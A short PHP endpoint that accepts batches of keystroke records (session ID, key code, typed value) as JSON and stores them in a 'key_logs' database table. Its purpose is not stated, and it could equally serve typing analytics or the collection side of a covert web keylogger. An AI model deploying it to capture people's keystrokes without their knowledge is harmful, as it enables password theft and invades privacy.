<?php
require_once 'config.php';
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
    exit;
}

$items = isset($data['items']) && is_array($data['items']) ? $data['items'] : [$data];
$stmt = $pdo->prepare('INSERT INTO key_logs (session_id, key_code, key_value, created_at) VALUES (?, ?, ?, NOW())');

$inserted = 0;
foreach ($items as $item) {
    $session = isset($item['session_id']) ? trim((string)$item['session_id']) : '';
    $code = isset($item['key_code']) ? trim((string)$item['key_code']) : '';
    $value = isset($item['key_value']) ? (string)$item['key_value'] : $code;
    if ($session === '' || $code === '') continue;
    $stmt->execute([$session, $code, $value]);
    $inserted++;
}

echo json_encode(['ok' => true, 'inserted' => $inserted]);
